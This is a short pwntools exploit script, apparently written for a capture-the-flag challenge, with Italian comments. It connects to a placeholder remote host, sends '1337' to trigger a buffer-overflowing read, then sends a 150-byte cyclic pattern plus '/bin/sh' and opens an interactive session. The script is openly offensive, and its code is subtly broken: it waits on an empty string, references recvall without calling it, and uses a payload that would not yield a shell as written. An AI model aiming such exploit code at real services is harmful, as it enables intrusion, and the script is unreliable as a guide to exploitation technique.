from pwn import *
r=remote(xxxxx)

#nota che l'overflow funziona se e solamente se come primo input si manda "1337" siccome farà un
#read che sfonda un buffer
r.recvuntil(b"(1-25): ")
r.sendline(b"1337")
r.recvuntil(b"")
payload=cyclic(150)
payload+=b"/bin/sh"
r.sendline(payload)
leak=r.recvall
print(leak)
r.interactive()
